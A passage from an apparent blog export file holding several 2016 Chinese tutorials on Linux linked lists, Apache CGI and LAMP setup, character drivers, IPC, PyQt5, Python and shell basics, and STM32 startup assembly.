        <tag>socket</tag>
      </tags>
  </entry>
  <entry>
    <title>LinuxKernel 入侵式双向链表的设计，分析，使用</title>
    <url>/2016/06/06/blog_idx_020/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




入侵式链表

  链表按照实现原理我分为两类，一是普通的链表，二是入侵式链表。（区别就是，链表结构体里面有没有数据）。由于我重写了Linux 链表的实现，部分东西被我更改，所以文中代码以我的实际代码为例。
下面围绕几点来理解一下：
  链表元素结构体声明：
// 
typedef struct y_list_head &#123;
struct y_list_head *next;
struct y_list_head *prev;
&#125; Y_LISTHEAD;

  节点元素结构体声明：
// 
typedef struct &#123;
int a;
Y_LISTHEAD list;
&#125; test;
  链表的头节点（用于存放一个链表的逻辑头，由于链表是双向，每个节点都是头）：
//declare a node for head of list .
#define LIST_HEAD(name) \
	Y_LISTHEAD name = LIST_HEAD_INIT(name)
  这里为了展示例子，我申请了几个变量:
test* ptr_test;
Y_LISTHEAD * pos;
test * entry;
  为节点申请内存，并赋值
ptr_test = (test *)malloc(sizeof(test));
ptr_test->a = 0;
  现在节点创建完毕，开始加入到链表
/*
 * Insert a new entry between two known consecutive entries.
 *
 * This is only for internal list manipulation where we know
 * the prev/next entries already!
 */
static inline void __list_add(Y_LISTHEAD *new,
                  Y_LISTHEAD *prev,
                  Y_LISTHEAD *next)
&#123;
    next->prev = new;
    new->next = next;
    new->prev = prev;
    prev->next = new;
&#125;
 
/**
 * list_add - add a new entry
 * @new: new entry to be added
 * @head: list head to add it after
 *
 * Insert a new entry after the specified head.
 * This is good for implementing stacks.
 */
static inline void list_add(Y_LISTHEAD *new, Y_LISTHEAD *head)
&#123;
    __list_add(new, head, head->next);
&#125;

LIST_ADD(&amp;ptr_test->list,&amp;test_list);
  同理，在添加几个。（详情见末尾例子）,然后，遍历链表并输出：
// 这里解释一下　GET_ENTRY（）宏函数
//caculate offset-value about member to start of the struct 
//计算结构体地址和结构体某成员的地址差值，也就是偏移值
#define OFFSET(type, member) ((unsigned int) &amp;((type *)0)->member)

//第一行声明了一个结构体元素类型的指针
//第二行通过偏移值计算结构体地址，这样就可以得到结构体内所有元素的值
//第三个参数member 为节点元素中，链表变量名
//第二个参数为节点元素类型名
#define GET_ENTRY(ptr, type, member) \
(&#123;   				\
    const typeof( ((type *)0)->member ) *__mptr = (ptr);	\
    (type *)( (char *)__mptr - OFFSET(type,member) );		\
&#125;)
/**
 * list_for_each iterate over a list
 * @pos:the &amp;struct list_head to use as a loop cursor.
 * @head:the head for your list.
 */
#define LIST_FOR_EACH(pos, head) \
    for (pos = (head)->next; pos != (head); pos = pos->next)

LIST_FOR_EACH(pos,&amp;test_list)&#123;
		
	entry = GET_ENTRY(pos,test,list);	
	printf("%d\n",entry->a);
&#125;
// 同理,  LIST_DEL_ENTRY()之类的宏定义都是同样的实现。
  实例:list_test.c
/*
*	FileName:list_test.c
*	Version: 1.0
*	Description: The file test my list if it is right
*	Created On:2016-5-15
*	Modified date:
*	Author:Sky
*
*/
#include &lt;stdio.h>
#include "Y_List/Y_List.h"
 
typedef struct &#123;
	int a;
	Y_LISTHEAD list;
&#125; test;
 
test* ptr_test;
 
int main(int argc, char * argv[])&#123;
	
	//test head;
 
	LIST_HEAD(test_list);
	Y_LISTHEAD * pos;
	test * entry;
	
	//INIT_LIST_HEAD(head->list);
	
	
	ptr_test = (test *)malloc(sizeof(test));
	ptr_test->a = 0;
	
	LIST_ADD(&amp;ptr_test->list,&amp;test_list);
 
	ptr_test = (test *)malloc(sizeof(test));
	ptr_test->a = 2;
	
	LIST_ADD_TAIL(&amp;ptr_test->list,&amp;test_list);
 
	ptr_test = (test *)malloc(sizeof(test));
	ptr_test->a = 4;
	
	LIST_ADD(&amp;ptr_test->list,&amp;test_list);
 
	ptr_test = (test *)malloc(sizeof(test));
	ptr_test->a = 8;
	
	LIST_ADD_TAIL(&amp;ptr_test->list,&amp;test_list);
 
 
	LIST_FOR_EACH(pos,&amp;test_list)&#123;
		
		entry = GET_ENTRY(pos,test,list);	
		printf("%d\n",entry->a);
	&#125;
 
 
	LIST_DEL_ENTRY(&amp;(ptr_test->list));
 
 
	LIST_FOR_EACH(pos,&amp;test_list)&#123;
		
		entry = GET_ENTRY(pos,test,list);	
		printf("%d\n",entry->a);
	&#125;
 
	
	LIST_FOR_EACH(pos,&amp;test_list)&#123;
		
		entry = GET_ENTRY(pos,test,list);
		free(entry);
	&#125;
 
 
	return 0;
&#125;

// LIST_ADD在给出地址后添加一个元素
// LIST_ADD_TAIL在给出地址前添加一个元素
// LIST_DEL_ENTRY删除指定地址的节点
  运行截图：

    
        
    
   
  其实链表只有几个部分要主要：


链表结构体


节点结构体


链表头


链表增删改查


  而在Linux的链表实现中，要注意下面这个东西，怎么确定的节点结构体地址，这是LInux链表实现的核心。搞清楚了这个，Ｌｉｎｕｘ链表你就会了GET_ENTRY（）
  如果希望查看上面项目代码，移步:https://github.com/flyinskyin2013/Y_LINUX_FRAME/tree/master/include/Y_List




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>c语言</tag>
        <tag>链表</tag>
        <tag>设计</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu14.04 apache2 配置 CGI(并测试:shell,可执行文件,python)</title>
    <url>/2016/07/10/blog_idx_023/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
OS版本： 59~14.04.1-Ubuntu SMP Tue Jul 7 15:07:27 UTC 2015
apache版本:


Server version: Apache/2.4.7 (Ubuntu)


Server built:   Jan 14 2016 17:45:23


前言

  无




Ubuntu apache2配置CGI



注意,apache2所有的配置文件的目录在/etc/apache2/，如图:



    
        
    
    


首先:进入sites-enabled 编辑其中的your.conf(默认为000-default.conf)文件.打开这个文件,然后去掉图中划线行的注释.(图中划线注释已被去掉),如图:



    
        
    
    


然后进入mods-enabled目录,打开mime.load 文件,添加模块,如图中划线部分.



    
        
    
  


最后,进入conf-enabled,打开serve-cgi-bin.conf添加与修改图中划线部分



    
        
    
  
注意:


ScriptAlias /cgi-bin/ /var/www/cgi-bin/


此句配置cgi-bin目录为/var/www/cgi-bin/


AddHandler cgi-script .cgi .pl .py .sh


此句配置可用的cgi程序类型,分别是可执行文件,perl脚本,python脚本,shell脚本




最后重启服务器


sudo /etc/init.d/apache2 restart


下面是各种类型脚本测试实例图片(注意观看url内容):



    
        
    
  

    
        
    
  

    
        
    
  




后记

无
参考文献
无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>apache</tag>
        <tag>CGI</tag>
        <tag>python</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Char-Driver （字符驱动　摘要）(一)</title>
    <url>/2016/06/14/blog_idx_021/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




Linux 系统运行时，文件系统与驱动的前世今生

  在Linux系统中，一切皆文件．所以在Linux中，设备也被作为一种文件来操作．而实现这些操作的，就叫做设备驱动．在Linux中，设备被分为三类:


字符设备（如，鼠标，键盘＝＝）


块设备（如硬盘）


网络设备（这里指网络接口，如常见的eth0,wlan0,lo）


  我们都知道，Linux一切皆文件，且，Linux具有两个空间－－用户与内核．那么具体到用户态的表现就是，我们Open某个设备后，我们就会得到一个在系统中唯一的文件描述符号fd.我们所有关于设备的操作，都是以fd为依据进行操作．那么我们来看一个字符驱动在的调用过程．


当我们在用户态执行到open(“/dev/xxx-device”,mode,flag)函数时．


文件系统会到系统中找一个与设备文件（例子中的/dev/xxx-device）对应的inode结构体，同时在一个设备表中去查到对应设备号i_rdev的struct cdev 地址赋值给i_cdev.


struct inode&#123;
		dev_t i_rdev; //设备编号
		umode_t i_mode;//设备类型
		struct cdev *i_cdev; //cdev 指向设备的内核的内部驱动结构
		......
		&#125;;
// 内核中的struct cdev
struct cdev
&#123;
  struct kobject kobj;//内嵌的kobject对象
  struct module *owner;//所属模块
  struct file_operations *ops;//文件操作结构体
  struct list_head list;
  dev_t dev;//设备号,长度为32位，其中高12为主设备号，低20位为此设备号
  unsigned int count;
&#125;;



找到了设备文件对应的inode后，文件系统将会建立file结构体．并初始化其中的变量，其中最重要的，也是我们写驱动将会用到的是f_op变量的值，这个就是我们驱动中的 struct file_operations 变量的地址．也就是为了使用这个地址，能够调用到我们在驱动中提供的操作设备的一些基本调用．


struct file&#123;
 
 mode_t fmode; //文件模式，如FMODE_READ，FMODE_WRITE
 
 ......
 
 loff_t f_pos; //loff_t 是一个64位的数，需要时，须强制转换为32位
 
 unsigned int f_flags; //文件标志，如：O_NONBLOCK

struct file_operations *f_op;

void *private_data; //非常重要，用于存放转换后的设备描述结构指针

.......

&#125;;


当以上的所有流程走完，那么我们就可以操作设备了．别如read(),write,ioctl()等等


  以上就是Linux中，驱动与文件系统的故事，只有了解了这些，我们才能够知道我们为何要用那样的方式，结构，架构等等去写Linux的驱动．




后记

  友情提示：我们在用户态操作设备，而驱动在内核态，是两个不同的地址空间．所以我们在用户态的一系列函数(如open(),read(),write(),ioctl()等等)都会被翻译为内核空间中对应的系统调用去执行．而不是直接执行的操作．想详细了解，可自行搜索关键字:Linux 系统调用
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>linux开发</category>
        <category>嵌入式</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>字符驱动</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux IPC（进程间通信）摘要（信号灯，共享内存，消息队列，管道）(一)</title>
    <url>/2016/07/20/blog_idx_024/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
Linux 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
前言



IPC—Inter-Process Communication(进程间通信)


UNIX 与 LINUX 没有直属血缘关系，是一个新创建的操作系统。LINUX可以说成参考MINIX(一个类UNIX系统，中间的缘由可以由自己百度)自己写的一个操作系统系统。


System V 是一个UNIX 系统的分支。POSIX是一个IEEE定制的一个标准。（可移植操作系统接口（Portable Operating System Interface ，缩写为 POSIX ））。


IPC 的种类很多，大概有一下几种：

A 原始的UNIX IPC
B 在A的基础上进化出System V IPC
C 在A的基础上进化出Socket IPC
D 由IEEE协会制定的POSIX标准中的IPC
E 由A，B，C，D 综合发展得到Linux IPC







IPC



Linux IPC
  由于一些历史原因，现在的linux内核里面常见的就是System V 和 Posix的通信。至于Socket IPC 已经被Linux 独立出来，叫做Linux 网络通信，其实本质上还是IPC,只不过由单机IPC，变为了多机IPC.(主要还是由tcp/ip协议作为支撑)


System V IPC


System V IPC主要包括：System V消息队列、System V信号灯、System V共享内存区。


System V IPC 有一个很明显的特征，那就是有一个关键字能够代表这个IPC,很明显这个关键字必须唯一的。得到这个关键字的方法有多种，但是我只用过一种，那就是用ftok()得到。


API集合

A System V消息队列

msgget()根据key与flag访问或者创建IPC对象。
msgctl()控制与销毁IPC对象
msgsnd/msgrcv()发送/接受消息


B System V信号灯

semget()根据key与flag访问或者创建IPC对象。
semctl()控制与销毁IPC对象
semop()操作IPC对象，也就是PV操作实现


C System V共享内存区

shmget()根据key与flag访问或者创建IPC对象。
shmctl()控制与销毁IPC对象
shmat()连接共享内存
shmdt()与共享内存分离







Posix IPC
  Posix IPC的的特征也很明显，与System V对比。首先API命名改变。是由IPC名称_IPC操作构成。其次是以一个名字作为标识符标示一个IPC对象。如信号量族：sem_open()/sem_close()/sem_trywait()/sem_post()


A Posix 信号量（命名信号量，未命名信号量（亲缘进程通信））

sem_open()/sem_close() 信号量打开或者创建。/信号量关闭。
sem_wait()/sem_trywait() V操作
sem_post()P 操作
sem_unlink()删除信号量
sem_getvalue()获取值
sem_init()未命名信号量初始化
sem_destory()未命名信号量销毁



B Posix 共享内存

shm_open()/shm_unlink()打开内存区域/删除内存区域
ftruncate（）清空内存区域
fstat（）通过文件描述符获取文件对应的属性。文件打开后这样操作.
mmap（）映射数据（文件）到当前进程空间
munmap（）与mmap相反



C Posix 消息队列

mq_open（）/mq_close（）同上可得
mq_unlink（）同上可得
mq_getattr()/mq_setattr()设置或得到mq的属性
mq_send()同英文含义
mq_receive()同英文含义
mq_notify()同英文含义





IPC 之管道
  管道分为命名管道和非命名管道，此概率可类比Posix 信号量。


unamepipe API:

pipe()建立匿名管道



namedpipe/fifo API：

mkfifo() 建立一个有名管道
unlink() 删除有名管道



管道操作：

read()/write()







后记

  从上面我们可以看到posix ipc比 system v 使用起来简单。但是也有一些不足。我们平时都是综合应用这些东西，就能够很好的完成工作了。当然，现在越来越倾向与写Posix IPC，因为方便移植。
  友情提示：我们在使用前，应该多看看帮助文档，因为可以少让你踩很多坑。
参考文献
无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>通信</tag>
        <tag>内存</tag>
        <tag>ipc</tag>
        <tag>管道</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 16.04 LAMP（PHP7.0） 环境搭建并测试</title>
    <url>/2016/08/26/blog_idx_026/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  Linux 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
前言

  无




Ubuntu 16.04 LAMP



首先安装mysql


sudo apt-get install mysql-server mysql-client

    
        
    
    


安装apache2


sudo apt-get install apache2

    
        
    
   


安装php7


sudo apt-get install php7
注意：此时是无法解析php网页的，因为没有安装apache php module


安装apache2 php7 module


sudo apt-get install libapache2-mod-php7.0


测试php是不是正常工作


sudo mv /var/www/html/index.html /var/www/html/index.html.bak
sudo echo “&lt;?php phpinfo();?>” > /var/www/html/index.php
sudo service apache2 restart


打开浏览器，输入localhost或者127.0.0.1会看到下图，就代表LAMP配置好了。



    
        
    
 
注意:这里没有测试Mysql是否正常，请自行实验。




后记

无
参考文献
无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>lamp</tag>
        <tag>mysql</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5 Ubuntu 16.04/14.04 环境配置</title>
    <url>/2016/12/01/blog_idx_029/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  起因，最近要用到PyQt5，所以想安装来写一个小程序，去网上查了半天，我发现网上的教程时间和空间复杂度爆炸，于是有了这个教程。




PyQt5



我查了查Ubuntu的库



    
        
    
  


居然没有，好伤心，继续查



    
        
    
  
  卧槽，好神奇，居然pyqt4,pyqt5都有耶。那就安装呗.
sudo apt-get install python3-pyqt5


开始测试


先上效果图：

    
        
    
  
  测试脚本下载（不直接提供文本的原因是CSDN这个编辑器的锅，这个锅我不背）:http://download.csdn.net/detail/u011728480/9699116




后记

无
参考文献
无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>python</category>
        <category>GUI开发</category>
        <category>linux开发</category>
        <category>Ubuntu使用</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>Qt</tag>
        <tag>python</tag>
        <tag>pyqt</tag>
      </tags>
  </entry>
  <entry>
    <title>python script 编写摘要(一)</title>
    <url>/2016/09/02/blog_idx_027/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  Linux  4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
前言

  无




python script



脚本头


#！/usr/bin/python
#此句用于指定脚本执行的py版本
# -*- coding: utf-8 -*-
#此句用于让python脚本能够识别一些字符，如汉字


变量


类型：
	数字: A=1 或者 A=3.1415926 或者 A=3.1e-2(0.031)(支持 + - * / // % 等)
	
	字符串:
	A='fu*k' 或者 A="fu*k 'somethings'"
	
	布尔: 
	A=True 或者 A=False ( 支持 or and not 运算 ) 
	
	list: 
	A=['sdf','sffff','fksdj']( 支持下标引用,append(),insert(position,value),pop(position) 等等) 
	
	tuple: 
	A=('sdf','sffff',['adfasdf','adfasdf'])(支持下标引用)

	dict:
	A=['X':10,'Y':20,'C':30](key/value键值对)
	set: 没用过只知道有这个东西
	A=([1,2,3])


流控制语句


while(注意缩进):
结构：
while 条件 :
	...
	...
	...

for (注意缩进):
结构：
for var in ...:
	...
	...
	...

if:
结构:
if 条件1:
    ...
    ...
elif 条件2:
    ...
    ...
else:
    ...
    ...


函数（支持递归）


函数定义
	
	def fuc_name(arg):
		...
		...
		...
		[return ...]
	
函数参数
	
	普通参数fuc_name(arg)
	默认参数fuc_name(arg=default)
	可变参数fuc_name(*arg) (结合tuple)
	关键字参数fuc_name(**arg) (结合dict)
	函数调用 fuc_name(arg)


module


一个模块的编写模板:
	
	#!/usr/bin/python
	# -*- coding: utf-8 -*-
	
	' this is module notes '
	#上一行是模块注释
	__author__ = 'Sky'
	#模块作者

	import sys

	def test():
	    args = sys.argv
	    if len(args)&lt;2:
            print('Usage:test(arg)!!!')
	    elif len(args)>2:
	        print('Too many arguments!')
	    else:
	        print('input arg is :%s\n' % args[1])

	if __name__=='__main__':
	    test()
	    #测试函数调用
特别提醒：
python 对缩进特别敏感，各位别踩这个坑
注意：此文章只能作为关键字参考，许多细节没有提出，但是对于一个新手，这个总结十分重要的。（同时：由于作者只是一个初学者，并不掌握py新特性，所以要了解py的新特性，请移步google,baidu）




后记

无
参考文献
无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>python</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>脚本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell 编写摘要 (一)</title>
    <url>/2016/08/25/blog_idx_025/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




Shell

  注释：本文中主要参考《shell脚本学习指南》和自己的理解所写而成


Shell 变量问题


算术展开: 
    $((算术表达式))     返回表达式的值
    eg: echo $((1+2*3))     返回7
    
变量替换（主要还是用来测试一个变量是否定义且不为空）:
    $(varname:-0)   varname未定义或者为null,返回0
        用处：用于测试变量是否定义
    $(varname:=0)   varname未定义或者为null，给varname赋值0
        用处：用于给未定义变量赋初值
    $(varname:?msg) varname未定义或者为null，返回msg
        用处：用于当变量未定义时，提示一个信息
    $(varname:+1) varname定义或者不为null,返回1
        用处：用于测试变量已经存在切不为null，返回1


位置参数(用于向脚本传入参数):
    $&#123;num&#125;    获取传入num'th的值
    $#        返回传入参数总的个数
    $@        以多个字符串方式返回所有传入参数
    $*        以一个字符串方式返回所有传入参数

特殊符号:
    $? 最近命令执行的返回值，0 表示成功执行，非0 表示有异常


Shell 脚本流控制


逻辑运算
	test 等效于 [ ...... ]
	eg: test "$var" = "$var1" 等效 [ "$var" = "$var1" ]
下面是非常重要的test 选项表

    
        
    
    

    
        
    
    

    
        
    
    
if 控制语句
格式:
    if pipeline
    then 
    ......
    elif pipeline
    then
    ......
    else
    ......
    fi
	
for 控制语句(支持continue,break)
格式：
    for var [in list]
    do
    ......
    done

while 控制语句(支持continue,break)
格式：
    while condition
    do
    ......
    done
until 控制语句(支持continue,break)
格式：
    until condition
    do
    ......
    done


脚本函数


函数定义(支持return 从函数返回):
functionName()&#123;
    ........
    return val
&#125;

函数调用(特殊变量$#,$@,$*等特殊位置变量会被临时覆盖)：
funcitonName arg0 arg1 arg2 ...




后记

无
参考文献
无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>STM32 启动代码分析</title>
    <url>/2016/12/01/blog_idx_028/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




STM32 启动代码分析

  对于keil的启动代码（针对STM32F042），添加 备注 和 自己的理解
;******************** (C) COPYRIGHT 2014 STMicroelectronics ********************
;* File Name          : startup_stm32f042.s
;* Author             : MCD Application Team,modified by Sky,
;* Version            : V1.5.0
;* Date               : 05-December-2014,modified on,01-Nov-2016
;* Description        : STM32F042 Devices vector table for
;*                      for MDK-ARM toolchain.
;*                      This module performs:
;*                      - Set the initial SP
;*                      - Set the initial PC == Reset_Handler
;*                      - Set the vector table entries with the exceptions ISR address
;*                      - Configure the system clock
;*                      - Branches to __main in the C library (which eventually
;*                        calls main()).
;*                      After Reset the CortexM0 processor is in Thread mode,
;*                      priority is Privileged, and the Stack is set to Main.
;* &lt;&lt;&lt; Use Configuration Wizard in Context Menu >>>   
;*******************************************************************************
;  @attention
; 
;  Licensed under MCD-ST Liberty SW License Agreement V2, (the "License");
;  You may not use this file except in compliance with the License.
;  You may obtain a copy of the License at:
; 
;         http:;;www.st.com/software_license_agreement_liberty_v2
; 
;  Unless required by applicable law or agreed to in writing, software 
;  distributed under the License is distributed on an "AS IS" BASIS, 
;  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
;  See the License for the specific language governing permissions and
;  limitations under the License.
; 
;*******************************************************************************




;
;
;notes:stack,heap,data seg,code seg address of mem is set by compiler
;
;










;
; Amount of memory (in bytes) allocated for Stack
; Tailor this value to your application needs
; &lt;h> Stack Configuration
;   &lt;o> Stack Size (in Bytes) &lt;0x0-0xFFFFFFFF:8>
; &lt;/h>\

;;EQU 定义宏
;;栈大小，1k
Stack_Size      EQU     0x00000400
;;AREA 定义段，注意：一个程序是由多个段构成，如CODE，STACK，DATA，
;;ALIGN=3,8字节对齐
                AREA    STACK, NOINIT, READWRITE, ALIGN=3
Stack_Mem       SPACE   Stack_Size
;;__initial_sp一个标号,由汇编器进行计算，代表上面SPACE分配内存的最后一个地址，栈为向下增长型
__initial_sp


; &lt;h> Heap Configuration
;   &lt;o>  Heap Size (in Bytes) &lt;0x0-0xFFFFFFFF:8>
; &lt;/h>
;;堆512bytes
Heap_Size       EQU     0x00000200

                AREA    HEAP, NOINIT, READWRITE, ALIGN=3
__heap_base
Heap_Mem        SPACE   Heap_Size
__heap_limit
;;PRESERVE8,指定当前文件堆栈8bytes对齐
                PRESERVE8
;;THUMB，后面的指令要兼容THUMB指令
                THUMB


; Vector Table Mapped to Address 0 at Reset
;;定义一个叫做RESET的数据段
                AREA    RESET, DATA, READONLY
;;EXPORT声明标号为外部文件可用
                EXPORT  __Vectors
                EXPORT  __Vectors_End
                EXPORT  __Vectors_Size
;;DCD是按4字节分配存储单元
__Vectors       DCD     __initial_sp                   ; Top of Stack
                        DCD     Reset_Handler                  ; Reset Handler
                        DCD     NMI_Handler                    ; NMI Handler
                        DCD     HardFault_Handler              ; Hard Fault Handler
                        DCD     0                              ; Reserved
                        DCD     0                              ; Reserved
                        DCD     0                              ; Reserved
                        DCD     0                              ; Reserved
                        DCD     0                              ; Reserved
                        DCD     0                              ; Reserved
                        DCD     0                              ; Reserved
                        DCD     SVC_Handler                    ; SVCall Handler
                        DCD     0                              ; Reserved
                        DCD     0                              ; Reserved
                        DCD     PendSV_Handler                 ; PendSV Handler
                        DCD     SysTick_Handler                ; SysTick Handler

                ; External Interrupts
                DCD     WWDG_IRQHandler                ; Window Watchdog
                DCD     PVD_VDDIO2_IRQHandler          ; PVD and VDDIO2 through EXTI Line detect
                DCD     RTC_IRQHandler                 ; RTC through EXTI Line
                DCD     FLASH_IRQHandler               ; FLASH
                DCD     RCC_CRS_IRQHandler             ; RCC and CRS
                DCD     EXTI0_1_IRQHandler             ; EXTI Line 0 and 1
                DCD     EXTI2_3_IRQHandler             ; EXTI Line 2 and 3
                DCD     EXTI4_15_IRQHandler            ; EXTI Line 4 to 15
                DCD     TSC_IRQHandler                 ; TS
                DCD     DMA1_Channel1_IRQHandler       ; DMA1 Channel 1
                DCD     DMA1_Channel2_3_IRQHandler     ; DMA1 Channel 2 and Channel 3
                DCD     DMA1_Channel4_5_IRQHandler     ; DMA1 Channel 4, Channel 5
                DCD     ADC1_IRQHandler                ; ADC1 
                DCD     TIM1_BRK_UP_TRG_COM_IRQHandler ; TIM1 Break, Update, Trigger and Commutation
                DCD     TIM1_CC_IRQHandler             ; TIM1 Capture Compare
                DCD     TIM2_IRQHandler                ; TIM2
                DCD     TIM3_IRQHandler                ; TIM3
                DCD     0                              ; Reserved
                DCD     0                              ; Reserved
                DCD     TIM14_IRQHandler               ; TIM14
                DCD     0                              ; Reserved
                DCD     TIM16_IRQHandler               ; TIM16
                DCD     TIM17_IRQHandler               ; TIM17
                DCD     I2C1_IRQHandler                ; I2C1
                DCD     0                              ; Reserved
                DCD     SPI1_IRQHandler                ; SPI1
                DCD     SPI2_IRQHandler                ; SPI2
                DCD     USART1_IRQHandler              ; USART1
                DCD     USART2_IRQHandler              ; USART2
                DCD     0                              ; Reserved
                DCD     CEC_CAN_IRQHandler             ; CEC and CAN
                DCD     USB_IRQHandler                 ; USB
                
__Vectors_End

__Vectors_Size  EQU  __Vectors_End - __Vectors

;;定义一个.text的代码段
                AREA    |.text|, CODE, READONLY

;STM32F03x devices feature 4Kbytes of static SRAM. STM32F04x devices feature
;6 Kbytes of static SRAM. STM32F05x devices feature 8Kbytes of static SRAM.
;STM32F07xS devices feature 16 Kbytes of static SRAM. STM32F09x devices feature
;32 Kbytes of static SRAM.





; Reset handler routine
;;PROC定义子程序
Reset_Handler    PROC 
;;WEAK:弱定义
                 EXPORT  Reset_Handler                 [WEAK]
        IMPORT  __main
        IMPORT  SystemInit


;;给R0赋值，sp的值
        LDR     R0, =__initial_sp          ; set stack pointer 
;;R0给MSP寄存器
        MSR     MSP, R0  

;;Check if boot space corresponds to test memory 

        LDR R0,=0x00000004
        LDR R1, [R0]
		;;R1=0x08000004 OR R1=0x20000004 OR R1=0x1FXX XXXX
		;;when R1=R1=0x1FXX XXXX,we can know that Reset_Handler'sAddress is not right,
		;;it maybe in reserved or systemmemory or optionbyte，we must remap address for start 
;;Logical shift right by register LSRS

        LSRS R1, R1, #24
		;R2=0x0000001F
        LDR R2,=0x1F
        CMP R1, R2
        
        BNE ApplicationStart  
     
;; SYSCFG clock enable    
     ;RCC_APB2ENR,0x40021018 
        LDR R0,=0x40021018 
        LDR R1,=0x00000001
        STR R1, [R0]
        
;; Set CFGR1 register with flash memory remap at address 0
     ;SYS_CFGR1,0x40010000 
        LDR R0,=0x40010000 
        LDR R1,=0x00000000
        STR R1, [R0]
ApplicationStart
                 LDR     R0, =SystemInit
                 BLX     R0
                 LDR     R0, =__main
                 BX      R0
                 ENDP

; Dummy Exception Handlers (infinite loops which can be modified)

NMI_Handler     PROC
                EXPORT  NMI_Handler                    [WEAK]
					;;B .   无限循环
                B       .
                ENDP
HardFault_Handler\
                PROC
                EXPORT  HardFault_Handler              [WEAK]
                B       .
                ENDP
SVC_Handler     PROC
                EXPORT  SVC_Handler                    [WEAK]
                B       .
                ENDP
PendSV_Handler  PROC
                EXPORT  PendSV_Handler                 [WEAK]
                B       .
